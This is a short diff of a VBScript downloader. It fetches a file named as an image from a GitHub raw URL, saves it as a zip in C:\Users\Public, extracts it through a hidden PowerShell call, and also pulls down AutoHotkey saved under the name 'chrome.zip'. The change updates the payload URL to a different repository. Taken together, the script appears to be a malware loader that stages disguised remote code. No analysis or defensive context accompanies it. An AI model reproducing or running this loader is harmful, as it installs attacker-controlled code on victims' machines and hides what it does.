@@ -7,7 +7,7 @@ Function DownloadAndExtract(url, zipPath, extractPath)
     ExtractCmd = "powershell.exe Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & extractPath & "'"
     Shell.Run ExtractCmd, 0, True
 End Function
-DownloadAndExtract "https://raw.githubusercontent.com/CrypticNet192/fdsdadasdsa/main/xw.jpg", "C:\Users\Public\bbbb.zip", "C:\Users\Public"
+DownloadAndExtract "https://raw.githubusercontent.com/DARK8771/Top/main/xw.jpg", "C:\Users\Public\bbbb.zip", "C:\Users\Public"
 DownloadAndExtract "https://www.autohotkey.com/download/1.1/AutoHotkey112304_ansi.zip", "C:\Users\Public\chrome.zip", "C:\Users\Public\"
 
 WScript.Sleep 3000
